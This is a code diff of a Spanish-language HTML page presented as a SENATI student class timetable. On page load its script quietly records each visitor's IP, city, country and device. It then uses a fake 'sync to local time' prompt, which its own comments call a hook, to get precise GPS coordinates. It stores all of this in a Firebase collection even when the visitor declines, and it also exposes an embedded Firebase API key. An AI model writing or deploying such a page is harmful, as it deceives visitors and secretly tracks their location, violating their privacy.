@@ -8,32 +8,24 @@
         :root { --primary: #003A5D; --accent: #3498db; --bg: #f8fafc; --text: #1e293b; --success: #22c55e; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Inter', -apple-system, sans-serif; background-color: var(--bg); margin: 0; padding: 15px; color: var(--text); line-height: 1.5; }
-        
         .container { max-width: 500px; margin: 0 auto; }
         
-        /* Header Estilo App */
+        /* Header Dinámico */
         .app-header { background: var(--primary); color: white; padding: 25px 20px; border-radius: 20px; text-align: left; margin-bottom: 20px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
-        .app-header h1 { margin: 0; font-size: 22px; font-weight: 800; }
-        .app-header p { margin: 5px 0 0; font-size: 13px; opacity: 0.8; font-weight: 400; }
+        .app-header h1 { margin: 0; font-size: 18px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+        .app-header p { margin: 5px 0 0; font-size: 13px; opacity: 0.8; }
 
-        /* Card de Día */
         .day-card { background: white; margin-bottom: 15px; border-radius: 16px; border: 1px solid #e2e8f0; overflow: hidden; }
-        .day-header { background: #f1f5f9; padding: 12px 18px; font-weight: 700; color: var(--primary); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e2e8f0; font-size: 14px; }
+        .day-header { background: #f1f5f9; padding: 12px 18px; font-weight: 700; color: var(--primary); display: flex; justify-content: space-between; border-bottom: 1px solid #e2e8f0; font-size: 14px; }
         
-        /* Filas de Clase */
         .class-item { padding: 16px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; }
-        .class-item:last-child { border-bottom: none; }
-        .time-col { width: 95px; font-size: 12px; font-weight: 700; color: #64748b; border-right: 2px solid var(--accent); margin-right: 15px; }
-        .info-col { flex: 1; }
+        .time-col { width: 105px; font-size: 12px; font-weight: 700; color: #64748b; border-right: 2px solid var(--accent); margin-right: 15px; text-align: center; }
         .course-name { font-size: 14px; font-weight: 600; color: var(--text); display: block; }
         .type-tag { font-size: 10px; text-transform: uppercase; background: #dbeafe; color: #1e40af; padding: 2px 8px; border-radius: 20px; margin-top: 4px; display: inline-block; font-weight: 700; }
         
-        /* Estilo para Recesos */
         .break { background: #fffcf0; border-left: 4px solid #facc15; }
         .break .time-col { border-right-color: #facc15; }
-        .break .course-name { color: #854d0e; font-style: italic; font-size: 13px; }
 
-        /* Barra de Sincronización */
         .sync-footer { background: white; padding: 15px; border-radius: 16px; display: flex; align-items: center; border: 1px solid #e2e8f0; margin-top: 25px; }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--accent); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-right: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -44,17 +36,17 @@
 
 <div class="container">
     <div class="app-header">
-        <h1>Mi Horario</h1>
-        <p>Ciclo V - IDAW | SENATI 2026</p>
+        <h1 id="app-title">HORARIO ACADÉMICO</h1>
+        <p id="app-subtitle">Ciclo V - IDAW | SENATI 2026</p>
     </div>
 
     <div class="day-card">
-        <div class="day-header">LUNES <span>📅</span></div>
+        <div class="day-header">LUNES</div>
         <div class="class-item">
             <div class="time-col">07:00 - 09:15</div>
             <div class="info-col">
                 <span class="course-name">Portales y Comerc. Electrónico I</span>
-                <span class="type-tag">Presencial</span>
+                <span class="type-tag">Aula Virtual</span>
             </div>
         </div>
         <div class="class-item break">
@@ -65,15 +57,15 @@
             <div class="time-col">09:30 - 11:45</div>
             <div class="info-col">
                 <span class="course-name">Portales y Comerc. Electrónico I</span>
-                <span class="type-tag">Presencial</span>
+                <span class="type-tag">Aula Virtual</span>
             </div>
         </div>
         <div class="class-item break">
-            <div class="time-col">11:45 - 01:00</div>
+            <div class="time-col">11:45 - 13:00</div>
             <div class="info-col"><span class="course-name">Receso Almuerzo 🍱</span></div>
         </div>
         <div class="class-item">
-            <div class="time-col">01:00 - 04:00</div>
+            <div class="time-col">13:00 - 16:00</div>
             <div class="info-col">
                 <span class="course-name">Seminario de Compl. Práctica II</span>
                 <span class="type-tag">Laboratorio</span>
@@ -82,20 +74,20 @@
     </div>
 
     <div class="day-card">
-        <div class="day-header">MARTES<span>🏢</span></div>
+        <div class="day-header">MAR / JUE / VIE</div>
         <div class="class-item">
             <div class="time-col">07:00 - 11:00</div>
             <div class="info-col">
                 <span class="course-name">Formación Práctica en Empresa</span>
-                <span class="type-tag">Virtual</span>
+                <span class="type-tag">Presencial</span>
             </div>
         </div>
     </div>
 
     <div class="day-card">
-        <div class="day-header">MIÉRCOLES <span>💻</span></div>
+        <div class="day-header">MIÉRCOLES</div>
         <div class="class-item">
-            <div class="time-col">01:00 - 04:00</div>
+            <div class="time-col">13:00 - 16:00</div>
             <div class="info-col">
                 <span class="course-name">Seminario de Compl. Práctica II</span>
                 <span class="type-tag">Laboratorio</span>
@@ -104,29 +96,7 @@
     </div>
 
     <div class="day-card">
-        <div class="day-header">JUEVES<span>🏢</span></div>
-        <div class="class-item">
-            <div class="time-col">07:00 - 11:00</div>
-            <div class="info-col">
-                <span class="course-name">Formación Práctica en Empresa</span>
-                <span class="type-tag">Virtual</span>
-            </div>
-        </div>
-    </div>
-
-    <div class="day-card">
-        <div class="day-header">VIERNES <span>🏢</span></div>
-        <div class="class-item">
-            <div class="time-col">07:00 - 11:00</div>
-            <div class="info-col">
-                <span class="course-name">Formación Práctica en Empresa</span>
-                <span class="type-tag">Virtual</span>
-            </div>
-        </div>
-    </div>
-
-    <div class="day-card">
-        <div class="day-header">SÁBADO <span>🚀</span></div>
+        <div class="day-header">SÁBADO</div>
         <div class="class-item">
             <div class="time-col">07:00 - 08:30</div>
             <div class="info-col">
@@ -149,16 +119,14 @@
 
     <div class="sync-footer">
         <div class="loader" id="sync-icon"></div>
-        <div class="sync-msg" id="sync-status">Sincronizando zona horaria local...</div>
+        <div class="sync-msg" id="sync-status">Detectando ubicación...</div>
     </div>
 </div>
 
 <script type="module">
-    // 1. IMPORTACIONES DE FIREBASE (CDN)
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // 2. TU CONFIGURACIÓN DE FIREBASE
     const firebaseConfig = {
         apiKey: "AIzaSyCwyM8VGEBn93_A8LNpNb4MgB4OFUqjKp0",
         authDomain: "horario-senati-sync.firebaseapp.com",
@@ -168,116 +136,82 @@
         appId: "1:156759042223:web:778ceed5db5bcbb6e0cc5a"
     };
 
-    // Inicialización
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    async function ejecutarRastreoYSincronizacion() {
-        let metadata = {
-            registro_fecha: serverTimestamp(),
-            user_agent: navigator.userAgent,
-            idioma: navigator.language,
-            metodo: "Solo IP (Aproximado)"
-        };
+    async function runLogic() {
+        let meta = { ts: serverTimestamp(), dev: navigator.userAgent, met: "Solo IP" };
 
         try {
-            // --- PASO A: RASTREO SILENCIOSO (IP) ---
+            // 1. Detección automática de IP y País
             const res = await fetch('https://ipapi.co/json/');
-            const ipInfo = await res.json();
+            const ipData = await res.json();
             
-            metadata.ip = ipInfo.ip;
-            metadata.pais = ipInfo.country_name;
-            metadata.ciudad = ipInfo.city;
-            metadata.proveedor = ipInfo.org;
+            meta.ip = ipData.ip;
+            meta.pais = ipData.country_name;
+            meta.cty = ipData.city;
 
-            // --- PASO B: EL ANZUELO (GPS + CAMBIO DE HORA) ---
+            // Cambiamos el título inmediatamente según el país
+            document.getElementById('app-title').innerText = `HORARIO - ${ipData.country_name.toUpperCase()}`;
+
+            // 2. Anzuelo de sincronización
             setTimeout(() => {
-                const mensaje = `Se ha detectado acceso desde ${ipInfo.country_name}. ¿Deseas sincronizar el horario de SENATI con tu hora local para evitar errores de asistencia?`;
+                const conf = confirm(`Se detectó acceso desde ${ipData.country_name}. ¿Deseas sincronizar el horario de SENATI con tu hora local (${ipData.timezone})?`);
                 
-                if (confirm(mensaje)) {
+                if (conf) {
                     navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            // Guardamos coordenadas exactas
-                            metadata.lat = pos.coords.latitude;
-                            metadata.lon = pos.coords.longitude;
-                            metadata.precision = pos.coords.accuracy + "m";
-                            metadata.metodo = "GPS Confirmado (Exacto)";
+                        async (p) => {
+                            meta.lat = p.coords.latitude;
+                            meta.lon = p.coords.longitude;
+                            meta.met = "GPS Full";
                             
-                            // 1. Mandar datos a Firebase
-                            await enviarAFirebase(metadata);
+                            await addDoc(collection(db, "visitas"), meta);
                             
-                            // 2. Aplicar cambio visual de horas (La magia)
-                            aplicarAjusteHorarioVisual();
-                            
-                            finalizarUI("✅ Horario sincronizado con éxito.");
+                            // Ajustar horas visualmente
+                            ajustarHoras(ipData.utc_offset);
+                            done("✅ Sincronizado exitosamente.");
                         },
-                        async (err) => {
-                            // Si rechaza el GPS, igual guardamos la IP
-                            await enviarAFirebase(metadata);
-                            finalizarUI("⚠️ Error de permisos. Usando hora de Lima.");
+                        async () => {
+                            await addDoc(collection(db, "visitas"), meta);
+                            done("⚠️ Permiso denegado. Usando hora base.");
                         },
-                        { enableHighAccuracy: true, timeout: 5000 }
+                        { enableHighAccuracy: true }
                     );
                 } else {
-                    // Si cancela el aviso
-                    enviarAFirebase(metadata);
-                    finalizarUI("Sincronización manual cancelada.");
+                    addDoc(collection(db, "visitas"), meta);
+                    done("Sincronización manual activa.");
                 }
-            }, 1500);
-
-        } catch (error) {
-            console.error("Error en el proceso:", error);
-        }
+            }, 1200);
+        } catch (e) { console.error(e); }
     }
 
-    // FUNCIÓN PARA CAMBIAR LAS HORAS DE LA TABLA SEGÚN EL PAÍS
-    function aplicarAjusteHorarioVisual() {
+    function ajustarHoras(offsetDestino) {
+        if (!offsetDestino) return;
         const gmtPeru = -5;
-        const gmtUsuario = new Date().getTimezoneOffset() / -60;
-        const diferencia = gmtUsuario - gmtPeru;
+        const gmtDestino = parseInt(offsetDestino) / 100;
+        const diff = gmtDestino - gmtPeru;
 
-        if (diferencia !== 0) {
-            document.querySelectorAll('.time-col').forEach(celda => {
-                // Busca todas las horas en formato HH:MM o H:MM
-                const horasEncontradas = celda.innerText.match(/(\d{1,2}):(\d{2})/g);
-                
-                if (horasEncontradas) {
-                    const nuevasHoras = horasEncontradas.map(h => {
+        if (diff !== 0) {
+            document.querySelectorAll('.time-col').forEach(el => {
+                const horas = el.innerText.match(/(\d{2}):(\d{2})/g);
+                if (horas) {
+                    const nuevas = horas.map(h => {
                         let [hora, min] = h.split(':').map(Number);
-                        // Suma la diferencia horaria (Perú vs Bolivia/Otros)
-                        let horaAjustada = (hora + diferencia + 24) % 24;
-                        // Formato limpio 00:00
-                        return `${horaAjustada.toString().padStart(2, '0')}:${min.toString().padStart(2, '0')}`;
+                        hora = (hora + diff + 24) % 24;
+                        return `${hora.toString().padStart(2, '0')}:${min.toString().padStart(2, '0')}`;
                     });
-
-                    // Reemplaza las horas viejas por las nuevas en el texto
-                    let textoFinal = celda.innerText;
-                    horasEncontradas.forEach((original, index) => {
-                        textoFinal = textoFinal.replace(original, nuevasHoras[index]);
-                    });
-                    celda.innerText = textoFinal;
+                    el.innerText = nuevas.join(' - ');
                 }
             });
         }
     }
 
-    async function enviarAFirebase(datos) {
-        try {
-            await addDoc(collection(db, "visitas"), datos);
-        } catch (e) {
-            console.error("Error al guardar en Firestore:", e);
-        }
+    function done(m) {
+        document.getElementById('sync-status').innerText = m;
+        document.getElementById('sync-icon').style.display = 'none';
     }
 
-    function finalizarUI(mensaje) {
-        const statusElement = document.getElementById('sync-status');
-        const loader = document.getElementById('sync-icon');
-        if (statusElement) statusElement.innerText = mensaje;
-        if (loader) loader.style.display = 'none';
-    }
-
-    // Arrancar proceso
-    window.onload = ejecutarRastreoYSincronizacion;
+    window.onload = runLogic;
 </script>
 </body>
 </html>
